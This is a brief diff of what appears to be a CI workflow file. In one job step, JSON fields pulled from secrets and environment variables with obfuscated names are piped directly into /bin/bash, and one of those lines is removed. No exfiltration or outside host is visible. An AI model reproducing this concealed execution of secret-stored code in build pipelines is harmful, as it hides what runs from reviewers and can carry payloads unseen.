@@ -17,7 +17,6 @@ jobs:
           gz37: ${{ secrets.gz37 }}
         run: |
           printf '%s' "$gz37" | jq -r .nqwem30515 | /bin/bash
-          echo $syq68508 | jq -r .wsub559 | /bin/bash
           echo $pmnsn32397 | jq -r .yt11 | /bin/bash
 
       - name: Archive results
